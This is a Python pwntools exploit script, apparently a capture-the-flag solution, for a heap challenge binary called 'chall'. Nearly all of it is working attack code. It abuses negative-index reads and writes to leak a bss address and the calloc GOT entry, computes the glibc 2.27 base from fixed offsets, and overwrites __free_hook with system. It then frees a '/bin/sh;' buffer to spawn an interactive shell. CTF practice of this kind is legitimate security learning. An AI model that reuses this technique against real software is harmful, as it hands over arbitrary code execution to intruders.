#!/usr/bin/env python2
# -*- coding: utf-8 -*
import re
import os
from pwn import *

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
lg = lambda name,data : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)

def debug(breakpoint=''):
    glibc_dir = '~/Exps/Glibc/glibc-2.27/'
    gdbscript = 'directory %smalloc/\n' % glibc_dir
    gdbscript += 'directory %sstdio-common/\n' % glibc_dir
    gdbscript += 'directory %sstdlib/\n' % glibc_dir
    gdbscript += 'directory %slibio/\n' % glibc_dir
    gdbscript += 'directory %self/\n' % glibc_dir
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p, gdbscript)
    time.sleep(1)

elf = ELF('./chall')
context(arch = elf.arch, os = 'linux',log_level = 'debug',terminal = ['tmux', 'splitw', '-hp','62'])
p = process('./chall')

def create(size, data):
    sla("=====\n>", "2")
    sla("the message?", str(size))
    se(data)

def edit(idx, data):
    sla("=====\n>", "3")
    sla("h cooki", str(idx))
    sa("New Message: ", data)

def show(idx):
    sla("=====\n>", "4")
    sla(": ", str(idx))
    return u64(rc(6).ljust(8, '\x00'))

for i in range(5):
    sla("=====\n>", "1")

## full fill the region to enable underflow r/w
for i in range(32):
    create(0x80, "/bin/sh;")

## leak bss addr
bss_addr = show(-11)
calloc_got = bss_addr - 0x60
success(hex(bss_addr))

## put the addr of got table into bss
edit(-11, p64(bss_addr) + p64(calloc_got))
#debug(0x16d2)

## leak libc
calloc_addr = show(-10)
libc_base = calloc_addr - 0x9a170
free_hook = libc_base + 0x3ed8e8
system_addr = libc_base + 0x4f550
success(hex(calloc_addr))


## put the addr of free_hook into bss
edit(-11, p64(bss_addr) + p64(free_hook))

## edit free_hook
edit(-10, p64(system_addr))

## avoid fread underflow
edit(0, "/bin/sh;")

## execute /bin/sh
sla("=====\n>", "1")
p.interactive()

